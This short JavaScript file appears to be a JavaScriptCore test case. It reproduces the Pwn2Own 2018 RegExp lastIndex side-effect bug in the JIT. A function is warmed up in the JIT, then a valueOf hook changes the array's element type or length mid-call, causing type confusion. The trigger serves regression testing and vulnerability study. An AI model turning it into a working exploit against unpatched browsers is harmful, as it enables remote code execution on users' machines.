// jsc: Pwn2Own 2018 regexp lastIndex side effect in JIT (saelo) jit-sideeffect
var arr = [1.1, 2.2, 3.3];
var re = /a/g;
function hot(a, r) { var x = a[0]; r.test('aaa'); return a[0] + x; }
for (var i = 0; i < 300; i++) { re.lastIndex = 0; hot(arr, re); }
re.lastIndex = { valueOf() { arr[0] = {}; return 0; } };
print(typeof hot(arr, re));
re.lastIndex = { valueOf() { arr.length = 0; return 0; } };
print(String(hot(arr, re)));
